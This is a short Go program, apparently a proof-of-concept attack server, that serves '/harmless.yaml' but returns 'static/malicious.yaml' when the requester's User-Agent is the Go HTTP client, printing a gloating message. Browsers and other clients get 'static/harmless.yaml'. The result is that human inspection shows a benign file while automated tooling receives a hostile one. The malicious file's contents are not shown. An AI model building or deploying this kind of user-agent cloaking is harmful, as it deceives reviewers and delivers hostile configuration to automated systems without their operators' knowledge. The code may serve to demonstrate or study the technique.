package main

import (
	"fmt"
	"net/http"
)

func serve_yaml(w http.ResponseWriter, req *http.Request) {
	ua := req.Header.Get("User-Agent")
	for name, headers := range req.Header {
		for _, h := range headers {
			fmt.Println(name, h)
		}
	}
	if ua == "Go-http-client/1.1" {
		fmt.Println("now apply malicious yaml...hahaha")
		http.ServeFile(w, req, "static/malicious.yaml")
	} else {
		http.ServeFile(w, req, "static/harmless.yaml")
	}
}

func main() {
	http.HandleFunc("/harmless.yaml", serve_yaml)
	http.ListenAndServe(":8080", nil)
}
